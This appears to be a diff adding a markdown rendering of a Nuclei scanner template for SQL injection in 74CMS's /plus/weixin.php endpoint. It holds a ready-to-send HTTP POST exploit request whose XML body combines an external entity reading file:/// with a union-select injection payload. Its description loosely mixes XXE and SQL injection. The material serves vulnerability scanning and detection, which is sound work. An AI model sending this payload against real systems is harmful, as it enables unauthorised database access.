@@ -1,0 +1,23 @@
+# Nuclei Template: 74CMS weixin.php - SQL Injection
+**Template ID:** 74cms-weixin-sqli
+**Vulnerability Class:** SQL Injection
+**Severity:** High
+**CWE:** CWE-89
+**Source:** Nuclei Template (`74cms-weixin-sqli.yaml`)
+
+## Vulnerability Information & PoC
+
+## Description
+There is a libxml_disable_entity_loader function to prevent XML eXternal Entity Injection, but this function needs to be customized by the user. If the user does not customize it, there will be no filtering, which leads to SQL injection vulnerabilities.
+
+## Steps to reproduce / Exploit Payload
+```http
+POST /plus/weixin.php?signature=da39a3ee5e6b4b0d3255bfef95601890afd80709&timestamp=&nonce= HTTP/1.1
+Host: {{Hostname}}
+Content-Type: text/xml
+
+<?xml version="1.0" encoding="utf-8"?><!DOCTYPE copyright [<!ENTITY test SYSTEM "file:///">]><xml><ToUserName>&test;</ToUserName><FromUserName>1111</FromUserName><MsgType>123</MsgType><FuncFlag>3</FuncFlag><Content>1%' union select md5({{num}})#</Content></xml>
+```
+
+## References
+- https://cn-sec.com/archives/25900.html
